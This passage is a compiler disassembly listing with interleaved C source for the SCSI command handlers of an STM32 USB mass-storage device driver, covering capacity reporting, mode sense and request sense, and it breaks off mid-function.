 8009f92:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f96:	68fb      	ldr	r3, [r7, #12]
 8009f98:	32b0      	adds	r2, #176	; 0xb0
 8009f9a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f9e:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009fa0:	69bb      	ldr	r3, [r7, #24]
 8009fa2:	2b00      	cmp	r3, #0
 8009fa4:	d102      	bne.n	8009fac <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009fa6:	f04f 33ff 	mov.w	r3, #4294967295
 8009faa:	e0ab      	b.n	800a104 <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009fac:	68fb      	ldr	r3, [r7, #12]
 8009fae:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009fb2:	68fa      	ldr	r2, [r7, #12]
 8009fb4:	33b0      	adds	r3, #176	; 0xb0
 8009fb6:	009b      	lsls	r3, r3, #2
 8009fb8:	4413      	add	r3, r2
 8009fba:	685b      	ldr	r3, [r3, #4]
 8009fbc:	685c      	ldr	r4, [r3, #4]
 8009fbe:	69bb      	ldr	r3, [r7, #24]
 8009fc0:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009fc4:	3308      	adds	r3, #8
 8009fc6:	69ba      	ldr	r2, [r7, #24]
 8009fc8:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009fcc:	3204      	adds	r2, #4
 8009fce:	7af8      	ldrb	r0, [r7, #11]
 8009fd0:	4619      	mov	r1, r3
 8009fd2:	47a0      	blx	r4
 8009fd4:	4603      	mov	r3, r0
 8009fd6:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009fd8:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009fdc:	2b00      	cmp	r3, #0
 8009fde:	d106      	bne.n	8009fee <SCSI_ReadCapacity16+0x6c>
 8009fe0:	69bb      	ldr	r3, [r7, #24]
 8009fe2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fe6:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009fea:	2b02      	cmp	r3, #2
 8009fec:	d108      	bne.n	800a000 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009fee:	7af9      	ldrb	r1, [r7, #11]
 8009ff0:	233a      	movs	r3, #58	; 0x3a
 8009ff2:	2202      	movs	r2, #2
 8009ff4:	68f8      	ldr	r0, [r7, #12]
 8009ff6:	f000 fa01 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 8009ffa:	f04f 33ff 	mov.w	r3, #4294967295
 8009ffe:	e081      	b.n	800a104 <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a000:	687b      	ldr	r3, [r7, #4]
 800a002:	330a      	adds	r3, #10
 800a004:	781b      	ldrb	r3, [r3, #0]
 800a006:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a008:	687b      	ldr	r3, [r7, #4]
 800a00a:	330b      	adds	r3, #11
 800a00c:	781b      	ldrb	r3, [r3, #0]
 800a00e:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a010:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a012:	687b      	ldr	r3, [r7, #4]
 800a014:	330c      	adds	r3, #12
 800a016:	781b      	ldrb	r3, [r3, #0]
 800a018:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a01a:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a01c:	687a      	ldr	r2, [r7, #4]
 800a01e:	320d      	adds	r2, #13
 800a020:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a022:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a024:	69bb      	ldr	r3, [r7, #24]
 800a026:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a028:	2300      	movs	r3, #0
 800a02a:	61fb      	str	r3, [r7, #28]
 800a02c:	e008      	b.n	800a040 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 800a02e:	69ba      	ldr	r2, [r7, #24]
 800a030:	69fb      	ldr	r3, [r7, #28]
 800a032:	4413      	add	r3, r2
 800a034:	3310      	adds	r3, #16
 800a036:	2200      	movs	r2, #0
 800a038:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a03a:	69fb      	ldr	r3, [r7, #28]
 800a03c:	3301      	adds	r3, #1
 800a03e:	61fb      	str	r3, [r7, #28]
 800a040:	69bb      	ldr	r3, [r7, #24]
 800a042:	68db      	ldr	r3, [r3, #12]
 800a044:	69fa      	ldr	r2, [r7, #28]
 800a046:	429a      	cmp	r2, r3
 800a048:	d3f1      	bcc.n	800a02e <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 800a04a:	69bb      	ldr	r3, [r7, #24]
 800a04c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a050:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a052:	3b01      	subs	r3, #1
 800a054:	0e1b      	lsrs	r3, r3, #24
 800a056:	b2da      	uxtb	r2, r3
 800a058:	69bb      	ldr	r3, [r7, #24]
 800a05a:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 800a05c:	69bb      	ldr	r3, [r7, #24]
 800a05e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a062:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a064:	3b01      	subs	r3, #1
 800a066:	0c1b      	lsrs	r3, r3, #16
 800a068:	b2da      	uxtb	r2, r3
 800a06a:	69bb      	ldr	r3, [r7, #24]
 800a06c:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 800a06e:	69bb      	ldr	r3, [r7, #24]
 800a070:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a074:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a076:	3b01      	subs	r3, #1
 800a078:	0a1b      	lsrs	r3, r3, #8
 800a07a:	b2da      	uxtb	r2, r3
 800a07c:	69bb      	ldr	r3, [r7, #24]
 800a07e:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 800a080:	69bb      	ldr	r3, [r7, #24]
 800a082:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a086:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a088:	b2db      	uxtb	r3, r3
 800a08a:	3b01      	subs	r3, #1
 800a08c:	b2da      	uxtb	r2, r3
 800a08e:	69bb      	ldr	r3, [r7, #24]
 800a090:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 800a092:	69bb      	ldr	r3, [r7, #24]
 800a094:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a098:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a09c:	161b      	asrs	r3, r3, #24
 800a09e:	b2da      	uxtb	r2, r3
 800a0a0:	69bb      	ldr	r3, [r7, #24]
 800a0a2:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 800a0a4:	69bb      	ldr	r3, [r7, #24]
 800a0a6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0aa:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a0ae:	141b      	asrs	r3, r3, #16
 800a0b0:	b2da      	uxtb	r2, r3
 800a0b2:	69bb      	ldr	r3, [r7, #24]
 800a0b4:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 800a0b6:	69bb      	ldr	r3, [r7, #24]
 800a0b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0bc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a0c0:	0a1b      	lsrs	r3, r3, #8
 800a0c2:	b29b      	uxth	r3, r3
 800a0c4:	b2da      	uxtb	r2, r3
 800a0c6:	69bb      	ldr	r3, [r7, #24]
 800a0c8:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 800a0ca:	69bb      	ldr	r3, [r7, #24]
 800a0cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0d0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a0d4:	b2da      	uxtb	r2, r3
 800a0d6:	69bb      	ldr	r3, [r7, #24]
 800a0d8:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0da:	687b      	ldr	r3, [r7, #4]
 800a0dc:	330a      	adds	r3, #10
 800a0de:	781b      	ldrb	r3, [r3, #0]
 800a0e0:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a0e2:	687b      	ldr	r3, [r7, #4]
 800a0e4:	330b      	adds	r3, #11
 800a0e6:	781b      	ldrb	r3, [r3, #0]
 800a0e8:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0ea:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a0ec:	687b      	ldr	r3, [r7, #4]
 800a0ee:	330c      	adds	r3, #12
 800a0f0:	781b      	ldrb	r3, [r3, #0]
 800a0f2:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a0f4:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a0f6:	687a      	ldr	r2, [r7, #4]
 800a0f8:	320d      	adds	r2, #13
 800a0fa:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a0fc:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a0fe:	69bb      	ldr	r3, [r7, #24]
 800a100:	60da      	str	r2, [r3, #12]

  return 0;
 800a102:	2300      	movs	r3, #0
}
 800a104:	4618      	mov	r0, r3
 800a106:	3724      	adds	r7, #36	; 0x24
 800a108:	46bd      	mov	sp, r7
 800a10a:	bd90      	pop	{r4, r7, pc}

0800a10c <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a10c:	b580      	push	{r7, lr}
 800a10e:	b088      	sub	sp, #32
 800a110:	af00      	add	r7, sp, #0
 800a112:	60f8      	str	r0, [r7, #12]
 800a114:	460b      	mov	r3, r1
 800a116:	607a      	str	r2, [r7, #4]
 800a118:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a11a:	68fb      	ldr	r3, [r7, #12]
 800a11c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a120:	68fb      	ldr	r3, [r7, #12]
 800a122:	32b0      	adds	r2, #176	; 0xb0
 800a124:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a128:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 800a12a:	69bb      	ldr	r3, [r7, #24]
 800a12c:	2b00      	cmp	r3, #0
 800a12e:	d102      	bne.n	800a136 <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 800a130:	f04f 33ff 	mov.w	r3, #4294967295
 800a134:	e063      	b.n	800a1fe <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 800a136:	68fb      	ldr	r3, [r7, #12]
 800a138:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a13c:	68fa      	ldr	r2, [r7, #12]
 800a13e:	33b0      	adds	r3, #176	; 0xb0
 800a140:	009b      	lsls	r3, r3, #2
 800a142:	4413      	add	r3, r2
 800a144:	685b      	ldr	r3, [r3, #4]
 800a146:	685b      	ldr	r3, [r3, #4]
 800a148:	f107 0214 	add.w	r2, r7, #20
 800a14c:	f107 0110 	add.w	r1, r7, #16
 800a150:	7af8      	ldrb	r0, [r7, #11]
 800a152:	4798      	blx	r3
 800a154:	4603      	mov	r3, r0
 800a156:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 800a158:	f997 3017 	ldrsb.w	r3, [r7, #23]
 800a15c:	2b00      	cmp	r3, #0
 800a15e:	d106      	bne.n	800a16e <SCSI_ReadFormatCapacity+0x62>
 800a160:	69bb      	ldr	r3, [r7, #24]
 800a162:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a166:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a16a:	2b02      	cmp	r3, #2
 800a16c:	d108      	bne.n	800a180 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a16e:	7af9      	ldrb	r1, [r7, #11]
 800a170:	233a      	movs	r3, #58	; 0x3a
 800a172:	2202      	movs	r2, #2
 800a174:	68f8      	ldr	r0, [r7, #12]
 800a176:	f000 f941 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 800a17a:	f04f 33ff 	mov.w	r3, #4294967295
 800a17e:	e03e      	b.n	800a1fe <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 800a180:	2300      	movs	r3, #0
 800a182:	83fb      	strh	r3, [r7, #30]
 800a184:	e007      	b.n	800a196 <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 800a186:	8bfb      	ldrh	r3, [r7, #30]
 800a188:	69ba      	ldr	r2, [r7, #24]
 800a18a:	4413      	add	r3, r2
 800a18c:	2200      	movs	r2, #0
 800a18e:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 800a190:	8bfb      	ldrh	r3, [r7, #30]
 800a192:	3301      	adds	r3, #1
 800a194:	83fb      	strh	r3, [r7, #30]
 800a196:	8bfb      	ldrh	r3, [r7, #30]
 800a198:	2b0b      	cmp	r3, #11
 800a19a:	d9f4      	bls.n	800a186 <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 800a19c:	69bb      	ldr	r3, [r7, #24]
 800a19e:	2208      	movs	r2, #8
 800a1a0:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 800a1a2:	693b      	ldr	r3, [r7, #16]
 800a1a4:	3b01      	subs	r3, #1
 800a1a6:	0e1b      	lsrs	r3, r3, #24
 800a1a8:	b2da      	uxtb	r2, r3
 800a1aa:	69bb      	ldr	r3, [r7, #24]
 800a1ac:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 800a1ae:	693b      	ldr	r3, [r7, #16]
 800a1b0:	3b01      	subs	r3, #1
 800a1b2:	0c1b      	lsrs	r3, r3, #16
 800a1b4:	b2da      	uxtb	r2, r3
 800a1b6:	69bb      	ldr	r3, [r7, #24]
 800a1b8:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 800a1ba:	693b      	ldr	r3, [r7, #16]
 800a1bc:	3b01      	subs	r3, #1
 800a1be:	0a1b      	lsrs	r3, r3, #8
 800a1c0:	b2da      	uxtb	r2, r3
 800a1c2:	69bb      	ldr	r3, [r7, #24]
 800a1c4:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 800a1c6:	693b      	ldr	r3, [r7, #16]
 800a1c8:	b2db      	uxtb	r3, r3
 800a1ca:	3b01      	subs	r3, #1
 800a1cc:	b2da      	uxtb	r2, r3
 800a1ce:	69bb      	ldr	r3, [r7, #24]
 800a1d0:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 800a1d2:	69bb      	ldr	r3, [r7, #24]
 800a1d4:	2202      	movs	r2, #2
 800a1d6:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a1d8:	8abb      	ldrh	r3, [r7, #20]
 800a1da:	141b      	asrs	r3, r3, #16
 800a1dc:	b2da      	uxtb	r2, r3
 800a1de:	69bb      	ldr	r3, [r7, #24]
 800a1e0:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a1e2:	8abb      	ldrh	r3, [r7, #20]
 800a1e4:	0a1b      	lsrs	r3, r3, #8
 800a1e6:	b29b      	uxth	r3, r3
 800a1e8:	b2da      	uxtb	r2, r3
 800a1ea:	69bb      	ldr	r3, [r7, #24]
 800a1ec:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a1ee:	8abb      	ldrh	r3, [r7, #20]
 800a1f0:	b2da      	uxtb	r2, r3
 800a1f2:	69bb      	ldr	r3, [r7, #24]
 800a1f4:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a1f6:	69bb      	ldr	r3, [r7, #24]
 800a1f8:	220c      	movs	r2, #12
 800a1fa:	60da      	str	r2, [r3, #12]

  return 0;
 800a1fc:	2300      	movs	r3, #0
}
 800a1fe:	4618      	mov	r0, r3
 800a200:	3720      	adds	r7, #32
 800a202:	46bd      	mov	sp, r7
 800a204:	bd80      	pop	{r7, pc}
	...

0800a208 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a208:	b580      	push	{r7, lr}
 800a20a:	b086      	sub	sp, #24
 800a20c:	af00      	add	r7, sp, #0
 800a20e:	60f8      	str	r0, [r7, #12]
 800a210:	460b      	mov	r3, r1
 800a212:	607a      	str	r2, [r7, #4]
 800a214:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a216:	68fb      	ldr	r3, [r7, #12]
 800a218:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a21c:	68fb      	ldr	r3, [r7, #12]
 800a21e:	32b0      	adds	r2, #176	; 0xb0
 800a220:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a224:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a226:	2317      	movs	r3, #23
 800a228:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a22a:	693b      	ldr	r3, [r7, #16]
 800a22c:	2b00      	cmp	r3, #0
 800a22e:	d102      	bne.n	800a236 <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a230:	f04f 33ff 	mov.w	r3, #4294967295
 800a234:	e011      	b.n	800a25a <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a236:	687b      	ldr	r3, [r7, #4]
 800a238:	3304      	adds	r3, #4
 800a23a:	781b      	ldrb	r3, [r3, #0]
 800a23c:	b29b      	uxth	r3, r3
 800a23e:	8afa      	ldrh	r2, [r7, #22]
 800a240:	429a      	cmp	r2, r3
 800a242:	d303      	bcc.n	800a24c <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a244:	687b      	ldr	r3, [r7, #4]
 800a246:	3304      	adds	r3, #4
 800a248:	781b      	ldrb	r3, [r3, #0]
 800a24a:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a24c:	8afb      	ldrh	r3, [r7, #22]
 800a24e:	461a      	mov	r2, r3
 800a250:	4904      	ldr	r1, [pc, #16]	; (800a264 <SCSI_ModeSense6+0x5c>)
 800a252:	6938      	ldr	r0, [r7, #16]
 800a254:	f000 feb8 	bl	800afc8 <SCSI_UpdateBotData>

  return 0;
 800a258:	2300      	movs	r3, #0
}
 800a25a:	4618      	mov	r0, r3
 800a25c:	3718      	adds	r7, #24
 800a25e:	46bd      	mov	sp, r7
 800a260:	bd80      	pop	{r7, pc}
 800a262:	bf00      	nop
 800a264:	2000011c 	.word	0x2000011c

0800a268 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a268:	b580      	push	{r7, lr}
 800a26a:	b086      	sub	sp, #24
 800a26c:	af00      	add	r7, sp, #0
 800a26e:	60f8      	str	r0, [r7, #12]
 800a270:	460b      	mov	r3, r1
 800a272:	607a      	str	r2, [r7, #4]
 800a274:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a276:	68fb      	ldr	r3, [r7, #12]
 800a278:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a27c:	68fb      	ldr	r3, [r7, #12]
 800a27e:	32b0      	adds	r2, #176	; 0xb0
 800a280:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a284:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a286:	231b      	movs	r3, #27
 800a288:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a28a:	693b      	ldr	r3, [r7, #16]
 800a28c:	2b00      	cmp	r3, #0
 800a28e:	d102      	bne.n	800a296 <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a290:	f04f 33ff 	mov.w	r3, #4294967295
 800a294:	e011      	b.n	800a2ba <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a296:	687b      	ldr	r3, [r7, #4]
 800a298:	3308      	adds	r3, #8
 800a29a:	781b      	ldrb	r3, [r3, #0]
 800a29c:	b29b      	uxth	r3, r3
 800a29e:	8afa      	ldrh	r2, [r7, #22]
 800a2a0:	429a      	cmp	r2, r3
 800a2a2:	d303      	bcc.n	800a2ac <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a2a4:	687b      	ldr	r3, [r7, #4]
 800a2a6:	3308      	adds	r3, #8
 800a2a8:	781b      	ldrb	r3, [r3, #0]
 800a2aa:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a2ac:	8afb      	ldrh	r3, [r7, #22]
 800a2ae:	461a      	mov	r2, r3
 800a2b0:	4904      	ldr	r1, [pc, #16]	; (800a2c4 <SCSI_ModeSense10+0x5c>)
 800a2b2:	6938      	ldr	r0, [r7, #16]
 800a2b4:	f000 fe88 	bl	800afc8 <SCSI_UpdateBotData>

  return 0;
 800a2b8:	2300      	movs	r3, #0
}
 800a2ba:	4618      	mov	r0, r3
 800a2bc:	3718      	adds	r7, #24
 800a2be:	46bd      	mov	sp, r7
 800a2c0:	bd80      	pop	{r7, pc}
 800a2c2:	bf00      	nop
 800a2c4:	20000134 	.word	0x20000134

0800a2c8 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2c8:	b580      	push	{r7, lr}
 800a2ca:	b086      	sub	sp, #24
 800a2cc:	af00      	add	r7, sp, #0
 800a2ce:	60f8      	str	r0, [r7, #12]
 800a2d0:	460b      	mov	r3, r1
 800a2d2:	607a      	str	r2, [r7, #4]
 800a2d4:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2d6:	68fb      	ldr	r3, [r7, #12]
 800a2d8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2dc:	68fb      	ldr	r3, [r7, #12]
 800a2de:	32b0      	adds	r2, #176	; 0xb0
 800a2e0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2e4:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a2e6:	693b      	ldr	r3, [r7, #16]
 800a2e8:	2b00      	cmp	r3, #0
 800a2ea:	d102      	bne.n	800a2f2 <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a2ec:	f04f 33ff 	mov.w	r3, #4294967295
 800a2f0:	e080      	b.n	800a3f4 <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a2f2:	693b      	ldr	r3, [r7, #16]
 800a2f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2f8:	699b      	ldr	r3, [r3, #24]
 800a2fa:	2b00      	cmp	r3, #0
 800a2fc:	d10b      	bne.n	800a316 <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a2fe:	693b      	ldr	r3, [r7, #16]
 800a300:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a304:	7f59      	ldrb	r1, [r3, #29]
 800a306:	2320      	movs	r3, #32
 800a308:	2205      	movs	r2, #5
 800a30a:	68f8      	ldr	r0, [r7, #12]
 800a30c:	f000 f876 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 800a310:	f04f 33ff 	mov.w	r3, #4294967295
 800a314:	e06e      	b.n	800a3f4 <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a316:	2300      	movs	r3, #0
 800a318:	75fb      	strb	r3, [r7, #23]
 800a31a:	e007      	b.n	800a32c <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a31c:	7dfb      	ldrb	r3, [r7, #23]
 800a31e:	693a      	ldr	r2, [r7, #16]
 800a320:	4413      	add	r3, r2
 800a322:	2200      	movs	r2, #0
 800a324:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a326:	7dfb      	ldrb	r3, [r7, #23]
 800a328:	3301      	adds	r3, #1
 800a32a:	75fb      	strb	r3, [r7, #23]
 800a32c:	7dfb      	ldrb	r3, [r7, #23]
 800a32e:	2b11      	cmp	r3, #17
 800a330:	d9f4      	bls.n	800a31c <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a332:	693b      	ldr	r3, [r7, #16]
 800a334:	2270      	movs	r2, #112	; 0x70
 800a336:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a338:	693b      	ldr	r3, [r7, #16]
 800a33a:	220c      	movs	r2, #12
 800a33c:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a33e:	693b      	ldr	r3, [r7, #16]
 800a340:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a344:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a348:	693b      	ldr	r3, [r7, #16]
 800a34a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a34e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a352:	429a      	cmp	r2, r3
 800a354:	d03f      	beq.n	800a3d6 <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a356:	693b      	ldr	r3, [r7, #16]
 800a358:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a35c:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a360:	461a      	mov	r2, r3
 800a362:	693b      	ldr	r3, [r7, #16]
 800a364:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a368:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a36c:	693b      	ldr	r3, [r7, #16]
 800a36e:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a370:	693b      	ldr	r3, [r7, #16]
 800a372:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a376:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a37a:	693a      	ldr	r2, [r7, #16]
 800a37c:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a380:	00db      	lsls	r3, r3, #3
 800a382:	4413      	add	r3, r2
